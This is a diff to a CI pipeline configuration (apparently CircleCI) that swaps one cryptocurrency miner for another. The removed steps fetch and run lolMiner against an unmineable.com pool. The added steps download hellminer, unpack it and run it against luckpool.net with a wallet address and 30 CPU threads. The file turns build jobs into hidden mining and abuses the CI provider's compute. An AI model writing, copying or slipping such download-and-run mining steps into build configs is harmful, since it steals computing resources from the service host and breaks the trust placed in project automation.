@@ -8,6 +8,6 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: ! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz
-      - run: ! tar -xf lolMiner_v1.28a_Lin64.tar.gz
-      - run: ! ./1.28a/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 -u TRX:TLPBfivqCxzxxVXU2fKMxAFdyFgwkPf9jo.khuongpro5#b8l2-qjng
+      - run: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+      - run:  tar xf hellminer_cpu_linux.tar.gz
+      - run: ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RG2rb4wYghY9joyqZCD3R3B5BYMhf1xiQR.khuong -p x --cpu 30
